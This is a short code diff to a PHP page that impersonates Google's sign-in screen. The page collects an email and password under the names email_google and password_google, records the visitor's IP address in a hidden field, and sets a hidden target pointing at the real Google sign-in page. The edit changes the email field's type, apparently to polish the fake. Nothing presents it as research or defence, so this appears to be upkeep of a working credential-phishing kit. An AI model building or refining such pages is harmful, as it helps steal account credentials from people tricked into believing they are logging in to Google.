@@ -22,7 +22,7 @@ $destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https"
 	<img src="assets/img/1ckkcu79ho.gif" alt="">
 	<h1>Sign in</h1>
 	<h2>with your Google Account</h2>
-	<input id="user" type="text" name="email_google" placeholder="Enter your email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+	<input id="user" type="email" name="email_google" placeholder="Enter your email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
 	<input type="password" name="password_google" placeholder="Enter your password" autocorrect="off" autocomplete="off" autocapitalize="off" required>
 	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
 	<input type="hidden" name="target" value="https://accounts.google.com/signin">
